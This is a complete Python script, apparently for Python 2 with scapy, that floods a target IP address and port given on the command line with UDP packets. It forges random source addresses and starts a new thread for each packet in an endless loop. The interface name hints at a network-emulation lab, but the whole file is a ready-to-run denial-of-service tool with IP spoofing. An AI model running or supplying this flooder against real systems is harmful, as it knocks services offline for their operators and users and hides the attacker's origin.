#!/usr/bin/env python

import socket
import random
import sys
import threading
from scapy.all import *

if len(sys.argv) != 3:
    print "Usage: %s <Target IP> <Port>" % sys.argv[0]
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
total = 0


class sendUDP(threading.Thread):
    global target, port

    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        i = IP()
        i.src = "%i.%i.%i.%i" % (random.randint(1, 254), random.randint(
			1, 254), random.randint(1, 254), random.randint(1, 254))
        i.dst = target
        t = UDP()
        t = UDP()
        t.sport = random.randint(1, 65535)
        t.dport = port


        send(i/ t, verbose=0, iface="h0-eth0")

print "Flooding %s:%i with UDP packets." %(target, port)
while 1:
    sendUDP().start()
    total += 1
    sys.stdout.write("\rTotal packets send:\t\t\t%i" % total)
        
